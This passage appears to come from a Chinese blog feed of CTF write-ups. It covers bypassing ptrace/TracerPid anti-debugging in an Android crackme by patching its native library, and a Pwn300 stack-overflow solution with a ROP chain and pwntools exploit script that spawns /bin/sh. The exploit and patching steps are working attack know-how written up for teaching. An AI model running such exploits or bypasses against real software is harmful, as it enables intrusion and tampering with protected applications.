src="https://ws1.sinaimg.cn/large/006tNc79ly1fny03c4jhmj314609e79b.jpg" alt=""><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny0utqfacj30ye08yjwd.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny0wnijqoj30yi0fe10x.jpg" alt=""><br>反编译一下，找到BLX R7那行函数,这个函数就是pthread_create,它调用sub_16A4<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny1sdzxa9j31je13sqk3.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny1sltzepj30tg0aiq4y.jpg" alt=""><br><strong>进入sub_16A4,它调用sub_130C，在这里进行反调试，所以我们只需要把它nop即可</strong><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny1trsaaaj30gy0a0myo.jpg" alt=""><h3 id="另外的一些分析"><a href="#另外的一些分析" class="headerlink" title="另外的一些分析"></a>另外的一些分析</h3>在module list里找到libc.so，再从中找到fopen函数<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny15obitcj30uc0ja11i.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny16bi70tj31160dsaea.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny16yfq3yj30uk0koq70.jpg" alt=""><br>在fopen断下之后，查看hex窗口<br>（在这之前需要先设置hex数据与R0同步）<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny1aniwolj30y00j444r.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny19n03wej317e0wsk8v.jpg" alt=""><br>查看一下这个8358进程是什么，果然是我们的crack apk，再看看它的status，发现被trace了<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny1eyodbcj30fw06omy2.jpg" alt=""><br>这个trace的进程就是我们的android_server<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny1g5po07j30et01bwel.jpg" alt=""></li></ul><h3 id="patch-so"><a href="#patch-so" class="headerlink" title="patch so"></a>patch so</h3><p>arm中对应的nop指令是：00 00 00 00<br>我们可以选择nop掉BL sub_130C,或者直接nop掉BLX R7，这里我们nop后者<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny2rrr0gdj30zw0p87io.jpg" alt=""><br>数据窗口中跟随，按F2去编辑<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny2sxbvkvj311y12kh53.jpg" alt=""><br>修改并保存<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny2u9p4oqj314i0ow14u.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny2ut0of2j30xq0y84g4.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny32s8rw5j30sq0i0jvt.jpg" alt=""><br><strong>感觉IDA的patch并不是很好用，所以我们记下地址后用010editor打开修改更好</strong><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny3cp95etj30uw08ftd1.jpg" alt=""><br>将原apk中的so文件替换为此so文件,重新打包签名安装,现在直接打开app调试就不会退出了. Success!</p><h2 id="securityCheck"><a href="#securityCheck" class="headerlink" title="securityCheck"></a>securityCheck</h2><h3 id="找到securityCheck函数下断"><a href="#找到securityCheck函数下断" class="headerlink" title="找到securityCheck函数下断"></a>找到securityCheck函数下断</h3><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny3joou5bj30ps0gp0w5.jpg" alt=""><br>输入密码后断下<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny3qea9cwj30kg07v41b.jpg" alt=""><br>剩下的就是很简单的比较<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny3u79wd5j30g207v764.jpg" alt=""><br>直接找到密码，over~<br>flag是aiyou,bucuoo</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> android reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反调试 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Android动态调试和ptrace反调试之读取进程status文件</title>
      <link href="/2018/01/30/ali_re2/"/>
      <url>/2018/01/30/ali_re2/</url>
      <content type="html"><![CDATA[<h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/AliCrackme_2.apk" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/AliCrackme_2.apk</a></p><h2 id="反调试原理"><a href="#反调试原理" class="headerlink" title="反调试原理"></a>反调试原理</h2><h3 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h3><p>ptrace提供了一种使父进程得以监视和控制其它进程的方式，它还能够改变子进程中的寄存器和内核映像，因而可以实现断点调试和系统调用的跟踪。<br>在执行系统调用之前，内核会先检查当前进程是否处于被“跟踪”(traced)的状态。如果是的话，内核<strong>暂停当前进程并将控制权交给跟踪进程</strong>，使跟踪进程得以察看或者修改被跟踪进程的寄存器。</p><h3 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h3><p>用fopen打开/proc/<pid>/status文件读取其中的TracerPid值来检测自己的进程是否被attach，<br>TracerPid如果为0说明没有别的进程在调试这个进程，如果不为0说明有程序在调试</pid></p><h3 id="反调试程序执行时机"><a href="#反调试程序执行时机" class="headerlink" title="反调试程序执行时机"></a>反调试程序执行时机</h3><ul><li>.init_array是一个so最先加载的一个段信息，时机最早，现在一般so解密操作都是在这里做的</li><li>JNI_OnLoad是so被System.loadLibrary调用的时候执行，它的时机要早于哪些native方法执行，但是没有.init_array时机早</li></ul><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><h3 id="连接到实体机，打开监听"><a href="#连接到实体机，打开监听" class="headerlink" title="连接到实体机，打开监听"></a>连接到实体机，打开监听</h3><p><code>./android_server</code><br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny05kit55j30et03x0tc.jpg" alt=""><br>这里开始监听设备的23946端口。</p><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>如果要想让IDA和这个android_server进行通信，那么必须让PC端的IDA也连上这个端口<br>adb forward tcp:远端设备端口号(进行调试程序端) tcp:本地设备端口(被调试程序端)<br><code>adb forward tcp:23946 tcp:23946</code></p><h3 id="打开要调试的apk，找到入口"><a href="#打开要调试的apk，找到入口" class="headerlink" title="打开要调试的apk，找到入口"></a>打开要调试的apk，找到入口</h3><p><code>adb shell dumpsys activity top</code><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny0bll6ovj30gi04nt9o.jpg" alt=""></p><h3 id="打开monitor"><a href="#打开monitor" class="headerlink" title="打开monitor"></a>打开monitor</h3><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0c5a6y0j31kw0m3nio.jpg" alt=""></p><h3 id="启动apk"><a href="#启动apk" class="headerlink" title="启动apk"></a>启动apk</h3><p><code>adb shell am start -D -n com.yaotong.crackme/.MainActivity</code><br>设备将处于一个Waiting For Debugger的状态</p><h3 id="在要调试的函数下断点，这里我们在JNI-OnLoad下断。"><a href="#在要调试的函数下断点，这里我们在JNI-OnLoad下断。" class="headerlink" title="在要调试的函数下断点，这里我们在JNI_OnLoad下断。"></a>在要调试的函数下断点，这里我们在JNI_OnLoad下断。</h3><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0l03rv2j31kw0n54d1.jpg" alt=""></p><h3 id="设置IDA"><a href="#设置IDA" class="headerlink" title="设置IDA"></a>设置IDA</h3><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0eyg040j318a14otra.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny0fqqwhcj30ue0nuq8u.jpg" alt=""></p><h3 id="attach进程"><a href="#attach进程" class="headerlink" title="attach进程"></a>attach进程</h3><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny0hgcahsj30ks0netg9.jpg" alt=""><br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0gyl380j30xc0qw7c7.jpg" alt=""><br>断在libc.so<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny0i5xmklj31h80ponbm.jpg" alt=""><br><strong>tips:这里为什么会断在libc.so中呢</strong><br>android系统中libc是c层中最基本的函数库，libc中封装了io、文件、socket等基本系统调用。所有上层的调用都需要经过libc封装层。所以libc.so是最基本的，所以会断在这里，而且我们还需要知道一些常用的系统so,比如linker</p><h3 id="在控制台使用jdb恢复进程运行"><a href="#在控制台使用jdb恢复进程运行" class="headerlink" title="在控制台使用jdb恢复进程运行"></a>在控制台使用jdb恢复进程运行</h3><p><code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code><br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0nb9v75j30g001wglx.jpg" alt=""><br>按下F9执行程序<br>弹出窗口，这里是问apk里的so文件和我们正在调试的是否是同一个，当然是same<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny0nt58mtj31kw0b647j.jpg" alt=""><br>正常情况会出现:<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny0ovayd9j30fm02ymxn.jpg" alt=""><br>报错处理：<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny0q9s9rhj30gb0ajjtg.jpg" alt=""></p><ul><li>打开ddms尝试.</li><li>检查调试的app配置文件中是否有android:debuggable=”true”，导致不能调试。若无则在清单文件的application中加上,重新打包即可.<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny0r84fb2j31jk0esq4l.jpg" alt=""><h3 id="JNI-OnLoad中单步调试找到check点"><a href="#JNI-OnLoad中单步调试找到check点" class="headerlink" title="JNI_OnLoad中单步调试找到check点"></a>JNI_OnLoad中单步调试找到check点</h3>函数顺利断下<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0rp83etj31fc0ou4d8.jpg" alt=""><br>F8单步找到Check点<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fnxzwyv4xkj316w0eyk0b.jpg" alt=""><br>执行<code>BLX R7</code>之后就跳入libc中断<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny03c4jhmj314609e79b.jpg" alt=""><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny0utqfacj30ye08yjwd.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny0wnijqoj30yi0fe10x.jpg" alt=""><br>反编译一下，找到BLX R7那行函数,这个函数就是pthread_create,它调用sub_16A4<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny1sdzxa9j31je13sqk3.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny1sltzepj30tg0aiq4y.jpg" alt=""><br><strong>进入sub_16A4,它调用sub_130C，在这里进行反调试，所以我们只需要把它nop即可</strong><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny1trsaaaj30gy0a0myo.jpg" alt=""><h3 id="另外的一些分析"><a href="#另外的一些分析" class="headerlink" title="另外的一些分析"></a>另外的一些分析</h3>在module list里找到libc.so，再从中找到fopen函数<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny15obitcj30uc0ja11i.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny16bi70tj31160dsaea.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny16yfq3yj30uk0koq70.jpg" alt=""><br>在fopen断下之后，查看hex窗口<br>（在这之前需要先设置hex数据与R0同步）<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny1aniwolj30y00j444r.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny19n03wej317e0wsk8v.jpg" alt=""><br>查看一下这个8358进程是什么，果然是我们的crack apk，再看看它的status，发现被trace了<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny1eyodbcj30fw06omy2.jpg" alt=""><br>这个trace的进程就是我们的android_server<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny1g5po07j30et01bwel.jpg" alt=""></li></ul><h3 id="patch-so"><a href="#patch-so" class="headerlink" title="patch so"></a>patch so</h3><p>arm中对应的nop指令是：00 00 00 00<br>我们可以选择nop掉BL sub_130C,或者直接nop掉BLX R7，这里我们nop后者<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny2rrr0gdj30zw0p87io.jpg" alt=""><br>数据窗口中跟随，按F2去编辑<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny2sxbvkvj311y12kh53.jpg" alt=""><br>修改并保存<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny2u9p4oqj314i0ow14u.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny2ut0of2j30xq0y84g4.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny32s8rw5j30sq0i0jvt.jpg" alt=""><br><strong>感觉IDA的patch并不是很好用，所以我们记下地址后用010editor打开修改更好</strong><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny3cp95etj30uw08ftd1.jpg" alt=""><br>将原apk中的so文件替换为此so文件,重新打包签名安装,现在直接打开app调试就不会退出了. Success!</p><h2 id="securityCheck"><a href="#securityCheck" class="headerlink" title="securityCheck"></a>securityCheck</h2><h3 id="找到securityCheck函数下断"><a href="#找到securityCheck函数下断" class="headerlink" title="找到securityCheck函数下断"></a>找到securityCheck函数下断</h3><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny3joou5bj30ps0gp0w5.jpg" alt=""><br>输入密码后断下<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny3qea9cwj30kg07v41b.jpg" alt=""><br>剩下的就是很简单的比较<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny3u79wd5j30g207v764.jpg" alt=""><br>直接找到密码，over~<br>flag是aiyou,bucuoo</p>]]></content>
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反调试 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>静态链接程序利用及湖湘杯Pwn300 writeup</title>
      <link href="/2018/01/25/stack_elf_static1/"/>
      <url>/2018/01/25/stack_elf_static1/</url>
      <content type="html"><![CDATA[<h2 id="Linux栈溢出——静态链接"><a href="#Linux栈溢出——静态链接" class="headerlink" title="Linux栈溢出——静态链接"></a>Linux栈溢出——静态链接</h2><p>一般情况下，静态链接的程序很少出现，但是也有一些。这类elf的漏洞利用，主要还是依靠程序本身和用户输入。<br>利用方式：<br>（1）程序中含有system函数和/bin/sh字符串，直接构造调用system(‘/bin/sh’)的payload。<br>（2）寻找程序中的gadget，直接构造出payload。</p><h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/湖湘杯2017/pwn300" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/湖湘杯2017/pwn300</a></p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fnrxyxheafj315a1a8k36.jpg" alt=""></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="checksec-安全性检查"><a href="#checksec-安全性检查" class="headerlink" title="checksec 安全性检查"></a>checksec 安全性检查</h3><p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fnrx2e7dquj30gs03zaal.jpg" alt=""><br>32位程序，没有ASLR，没有canary，可以说是十分好利用了。</p><h3 id="查看是否静态链接"><a href="#查看是否静态链接" class="headerlink" title="查看是否静态链接"></a>查看是否静态链接</h3><p>ldd pwn300<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fnry61724rj309v01iaa3.jpg" alt=""><br>确定是静态链接了，那么我们之间在elf文件里找gadget即可</p><h3 id="ROPgadget生成rop链"><a href="#ROPgadget生成rop链" class="headerlink" title="ROPgadget生成rop链"></a>ROPgadget生成rop链</h3><p>关于ROPgadget：<a href="https://github.com/JonathanSalwan/ROPgadget/tree/master" target="_blank" rel="noopener">https://github.com/JonathanSalwan/ROPgadget/tree/master</a><br>关于ROP：<a href="https://www.slideshare.net/hackstuff/rop-40525248" target="_blank" rel="noopener">https://www.slideshare.net/hackstuff/rop-40525248</a><br><code>ROPgadget --binary pwn300 --ropchain</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># execve generated by ROPgadget</span></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ed0a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080bb406</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080a1dad</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ed0a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080bb406</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080a1dad</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ed0a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08054730</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080a1dad</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ed31</span>) <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ed0a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08054730</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049781</span>) <span class="comment"># int 0x80</span></span><br></pre></td></tr></table></figure></p><p>因为我们需要的不是这种形式的，所以写个脚本处理一下。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">rop = []</span><br><span class="line"><span class="comment"># i = 1</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">"data"</span>):</span><br><span class="line">    <span class="comment"># print line,</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"pack"</span> <span class="keyword">in</span> line:</span><br><span class="line">        <span class="comment"># print i</span></span><br><span class="line">        <span class="comment"># print str(line).split(", ")[1].split(")")[0]</span></span><br><span class="line">        rop.append(str(line).split(<span class="string">", "</span>)[<span class="number">1</span>].split(<span class="string">")"</span>)[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># print i</span></span><br><span class="line">        <span class="comment"># print line</span></span><br><span class="line">        rop.append(str(line).split(<span class="string">"+= "</span>)[<span class="number">1</span>][<span class="number">1</span>:<span class="number">-2</span>])</span><br><span class="line">    <span class="comment"># i += 1</span></span><br><span class="line"><span class="keyword">print</span> rop</span><br></pre></td></tr></table></figure></p><p>[‘0x0806ed0a’, ‘0x080ea060’, ‘0x080bb406’, ‘/bin’, ‘0x080a1dad’, ‘0x0806ed0a’, ‘0x080ea064’, ‘0x080bb406’, ‘//sh’, ‘0x080a1dad’, ‘0x0806ed0a’, ‘0x080ea068’, ‘0x08054730’, ‘0x080a1dad’, ‘0x080481c9’, ‘0x080ea060’, ‘0x0806ed31’, ‘0x080ea068’, ‘0x080ea060’, ‘0x0806ed0a’, ‘0x080ea068’, ‘0x08054730’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x08049781’]<br>把两个字符串再处理一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">print &apos;0x&apos;+binascii.b2a_hex(&apos;nib/&apos;)</span><br><span class="line">print &apos;0x&apos;+binascii.b2a_hex(&apos;hs//&apos;)</span><br></pre></td></tr></table></figure></p><p>得到0x6e69622f,0x68732f2f<br>替换进去，得到rop=<br>[‘0x0806ed0a’, ‘0x080ea060’, ‘0x080bb406’, ‘0x6e69622f’, ‘0x080a1dad’, ‘0x0806ed0a’, ‘0x080ea064’, ‘0x080bb406’, ‘0x68732f2f’, ‘0x080a1dad’, ‘0x0806ed0a’, ‘0x080ea068’, ‘0x08054730’, ‘0x080a1dad’, ‘0x080481c9’, ‘0x080ea060’, ‘0x0806ed31’, ‘0x080ea068’, ‘0x080ea060’, ‘0x0806ed0a’, ‘0x080ea068’, ‘0x08054730’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x08049781’]</p><p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fns55rhcvpj30gf07wdgr.jpg" alt=""></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">shellcode_hex=[&apos;0x0806ed0a&apos;, &apos;0x080ea060&apos;, &apos;0x080bb406&apos;, &apos;0x6e69622f&apos;, &apos;0x080a1dad&apos;, &apos;0x0806ed0a&apos;, &apos;0x080ea064&apos;, &apos;0x080bb406&apos;, &apos;0x68732f2f&apos;, &apos;0x080a1dad&apos;, &apos;0x0806ed0a&apos;, &apos;0x080ea068&apos;, &apos;0x08054730&apos;, &apos;0x080a1dad&apos;, &apos;0x080481c9&apos;, &apos;0x080ea060&apos;, &apos;0x0806ed31&apos;, &apos;0x080ea068&apos;, &apos;0x080ea060&apos;, &apos;0x0806ed0a&apos;, &apos;0x080ea068&apos;, &apos;0x08054730&apos;, &apos;0x0807b75f&apos;, &apos;0x0807b75f&apos;, &apos;0x0807b75f&apos;, &apos;0x0807b75f&apos;, &apos;0x0807b75f&apos;, &apos;0x0807b75f&apos;, &apos;0x0807b75f&apos;, &apos;0x0807b75f&apos;, &apos;0x0807b75f&apos;, &apos;0x0807b75f&apos;, &apos;0x0807b75f&apos;, &apos;0x08049781&apos;]</span><br><span class="line">shellcode=[]</span><br><span class="line">for i in shellcode_hex:</span><br><span class="line">     shellcode.append(int(i,16))</span><br><span class="line">payload = []</span><br><span class="line">QJ = 16</span><br><span class="line">for i in range(QJ):</span><br><span class="line">    payload.append(i)</span><br><span class="line">for i in shellcode:</span><br><span class="line">    payload.append(i)</span><br><span class="line">p = process(&apos;pwn300&apos;)</span><br><span class="line"># p = remote(&apos;118.190.85.135&apos;,10080)</span><br><span class="line">tot = QJ+len(shellcode)</span><br><span class="line">p.recvuntil(&apos;calculate:&apos;)</span><br><span class="line">p.sendline(str(tot+1))</span><br><span class="line">for i in range(QJ):</span><br><span class="line">    p.recvuntil(&apos;5 Save the result\n&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;input the integer x:&apos;)</span><br><span class="line">    p.sendline(&apos;0&apos;)</span><br><span class="line">    p.recvuntil(&apos;input the integer y:&apos;)</span><br><span class="line">    p.sendline(&apos;0&apos;)</span><br><span class="line">    p.recvuntil(&apos;\n&apos;)</span><br><span class="line">for i in range(QJ,tot):</span><br><span class="line">    p.recvuntil(&apos;5 Save the result\n&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;input the integer x:&apos;)</span><br><span class="line">    p.sendline(str(payload[i]))</span><br><span class="line">    p.recvuntil(&apos;input the integer y:&apos;)</span><br><span class="line">    p.sendline(&apos;0&apos;)</span><br><span class="line">    p.recvuntil(&apos;\n&apos;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(&apos;5&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 栈溢出 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态链接 </tag>
